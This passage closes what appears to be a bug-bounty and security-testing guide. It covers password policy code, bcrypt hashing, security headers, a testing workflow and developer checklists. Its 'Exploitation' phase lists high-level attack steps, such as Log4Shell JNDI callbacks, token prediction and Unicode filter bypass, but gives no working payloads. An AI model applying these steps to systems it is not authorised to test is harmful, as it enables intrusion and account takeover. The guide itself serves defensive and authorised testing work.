    if check_breached_password(password):
        return False, "Password found in breach database"
    
    return True, "Password accepted"
```

**Additional Security Layers:**
```
- Rate limiting: 5 attempts per 15 minutes
- Account lockout: After 10 failed attempts
- CAPTCHA: After 3 failed attempts
- MFA: Required for admin accounts
- Password expiration: 90 days for privileged accounts
- History: Cannot reuse last 5 passwords
- Breach monitoring: Alert users of compromised passwords
```

**Secure Storage:**
```python
# Use strong hashing (bcrypt, argon2, scrypt)
import bcrypt

# Hash password
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))

# Verify password
if bcrypt.checkpw(provided_password.encode('utf-8'), stored_hash):
    # Password correct
```

**User Education:**
```
- Provide password strength meter
- Explain why requirements exist
- Suggest using password managers
- Warn about password reuse
- Notify of breach discoveries
```

---

## 6. Summary and Best Practices

### Quick Reference Matrix

| Vulnerability | Detection | Impact | Priority |
|--------------|-----------|---------|----------|
| Predictable Random Values | Pattern analysis, sample collection | Account takeover, session hijacking | High |
| Log4Shell | JNDI payload injection | Remote code execution | Critical |
| Unicode Injection | Character transformation testing | XSS, filter bypass, RCE | Medium-High |
| Missing Security Headers | Header inspection | XSS, MITM, clickjacking | Medium-High |
| Weak Password Policy | Registration testing | Credential compromise | Medium |

### Testing Workflow

**Phase 1: Reconnaissance**
1. Identify input points (forms, headers, APIs)
2. Map authentication mechanisms
3. Enumerate technologies and frameworks
4. Review security headers

**Phase 2: Vulnerability Identification**
1. Test random value generation
2. Check for Log4j usage and version
3. Submit Unicode characters to inputs
4. Inspect all HTTP headers
5. Test password policy enforcement

**Phase 3: Exploitation**
1. Attempt to predict tokens/sessions
2. Execute JNDI callbacks for Log4Shell
3. Bypass filters with Unicode
4. Exploit missing headers (XSS, clickjacking)
5. Register with weak passwords

**Phase 4: Impact Assessment**
1. Determine scope of vulnerabilities
2. Chain vulnerabilities for higher impact
3. Document proof-of-concept
4. Calculate severity scores

**Phase 5: Reporting**
1. Clear description of vulnerability
2. Step-by-step reproduction
3. Proof-of-concept code/screenshots
4. Impact analysis
5. Remediation recommendations

### Essential Security Headers Configuration

```
# Complete secure header set
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
X-XSS-Protection: 0
```

### Developer Security Checklist

**Random Generation:**
- [ ] Use cryptographically secure RNGs only
- [ ] Minimum 16 bytes of entropy
- [ ] Use UUID v4 for identifiers
- [ ] Never use timestamps as sole randomness
- [ ] Implement rate limiting on token generation

**Input Validation:**
- [ ] Normalize Unicode early in processing
- [ ] Use strict allow-lists
- [ ] Validate after all transformations
- [ ] Implement context-aware output encoding
- [ ] Reject unexpected character ranges

**Security Headers:**
- [ ] HSTS with preload and includeSubDomains
- [ ] Strict CSP without unsafe-inline/unsafe-eval
- [ ] X-Content-Type-Options: nosniff
- [ ] frame-ancestors 'none' or specific origins
- [ ] Proper CORS with origin validation

**Password Security:**
- [ ] Minimum 12 characters enforced server-side
- [ ] Complexity requirements checked
- [ ] Common password blacklist
- [ ] Breach database integration
- [ ] Strong hashing (bcrypt/argon2)
- [ ] MFA for privileged accounts

**Logging and Monitoring:**
- [ ] Update Log4j to latest version (≥2.17.1)
- [ ] Remove JNDI lookup capability if not needed
- [ ] Monitor for JNDI patterns in logs
- [ ] Alert on suspicious Unicode sequences
- [ ] Track failed authentication attempts
- [ ] Monitor CSP violation reports

### Tools Reference

**General:**
- Burp Suite Professional
- OWASP ZAP
- curl/httpie
- Browser Developer Tools

**Specific:**
- log4j-scan: Log4Shell detection
- guidtool: UUID v1 exploitation
- securityheaders: Header analysis
- CORScanner: CORS misconfiguration detection
- CSP Evaluator: CSP policy analysis

**Resources:**
- Unicode Explorer: https://unicode-explorer.com/
- worst.fit: Windows best-fit mappings
- HSTS Preload: https://hstspreload.org/
- Have I Been Pwned API: https://haveibeenpwned.com/API
- CSP Evaluator: https://csp-evaluator.withgoogle.com/

---

## End of Document

This comprehensive guide covers predictable random values, Log4Shell, Unicode injection, HTTP security headers, and password security policies. Use this as a reference for security testing, exploitation, and remediation in bug bounty hunting and security assessments.